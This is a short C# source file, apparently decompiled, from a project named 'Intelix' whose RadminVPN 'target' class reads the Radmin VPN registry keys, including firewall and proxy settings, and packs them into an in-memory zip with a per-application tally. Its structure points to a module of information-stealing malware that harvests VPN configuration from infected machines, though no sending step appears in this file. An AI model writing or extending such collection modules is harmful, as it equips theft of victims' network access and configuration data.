using System;
using System.Collections.Generic;
using System.Linq;
using Intelix.Helper;
using Intelix.Helper.Data;
using Microsoft.Win32;

namespace Intelix.Targets.Vpn
{
	// Token: 0x02000013 RID: 19
	public class RadminVPN : ITarget
	{
		// Token: 0x06000039 RID: 57 RVA: 0x00003290 File Offset: 0x00001490
		public void Collect(InMemoryZip zip, Counter counter)
		{
			List<string> list = new List<string>();
			using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\WOW6432Node\\Famatech\\RadminVPN", false))
			{
				list.AddRange(RegistryParser.ParseKey(registryKey));
			}
			using (RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\WOW6432Node\\Famatech\\RadminVPN\\1.0", false))
			{
				list.AddRange(RegistryParser.ParseKey(registryKey2));
			}
			using (RegistryKey registryKey3 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\WOW6432Node\\Famatech\\RadminVPN\\1.0\\Firewall", false))
			{
				list.AddRange(RegistryParser.ParseKey(registryKey3));
			}
			using (RegistryKey registryKey4 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\WOW6432Node\\Famatech\\RadminVPN\\1.0\\Proxy", false))
			{
				list.AddRange(RegistryParser.ParseKey(registryKey4));
			}
			bool flag = list.Any<string>();
			if (flag)
			{
				string text = "RadminVPN\\Registry.txt";
				zip.AddTextFile(text, string.Join("\n", list));
				Counter.CounterApplications counterApplications = new Counter.CounterApplications();
				counterApplications.Name = "RadminVPN";
				counterApplications.Files.Add("SOFTWARE\\WOW6432Node\\Famatech\\RadminVPN => " + text);
				counterApplications.Files.Add("SOFTWARE\\WOW6432Node\\Famatech\\RadminVPN\\1.0 => " + text);
				counterApplications.Files.Add("SOFTWARE\\WOW6432Node\\Famatech\\RadminVPN\\1.0\\Firewall => " + text);
				counterApplications.Files.Add("SOFTWARE\\WOW6432Node\\Famatech\\RadminVPN\\1.0\\Proxy => " + text);
				counterApplications.Files.Add(text);
				counterApplications.Files.Add("RadminVPN\\");
				counter.Vpns.Add(counterApplications);
			}
		}
	}
}
